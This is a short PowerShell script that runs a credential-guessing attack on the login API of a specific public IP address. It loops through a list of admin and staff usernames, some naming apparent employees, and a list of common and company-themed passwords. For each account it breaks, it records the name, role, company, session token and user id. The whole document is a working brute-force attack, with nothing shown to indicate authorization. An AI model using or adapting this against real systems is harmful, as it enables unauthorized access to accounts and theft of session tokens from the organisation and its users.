$baseUrl = "http://104.215.157.203:120"
$users = @('admin', 'moxx_admin1', 'moxx_admin2', 'mm_admin1', 'mm_admin2', 'mm_admin3', 'user1', 'user2', 'user', 'superadmin', 'tanvir_sales', 'rahim_field', 'karim_mkt', 'moxx_emp1', 'manager', 'employee')
$passwords = @('Admin@123', 'admin@123', 'User@123', 'user@123', 'password123', 'Password123', 'admin123', '123456', 'Admin123', '12345678', 'password', 'Password@123', 'Moxx@123', 'zynex@123', 'sa1234')

$found = @()
foreach ($u in $users) {
    foreach ($p in $passwords) {
        try {
            $body = @{ username = $u; password = $p } | ConvertTo-Json
            $res = Invoke-RestMethod -Uri "$baseUrl/api/Auth/login" -Method Post -ContentType "application/json" -Body $body -ErrorAction Stop
            Write-Host "[FOUND] Username: $u | Password: $p | Name: $($res.name) | Role: $($res.role) | Company: $($res.companyName)" -ForegroundColor Green
            $found += [PSCustomObject]@{
                Username = $u
                Password = $p
                Name = $res.name
                Role = $res.role
                Company = $res.companyName
                Token = $res.token
                Id = $res.id
            }
            break
        } catch {
        }
    }
}

if ($found.Count -eq 0) {
    Write-Host "No user found with quick password list." -ForegroundColor Yellow
}
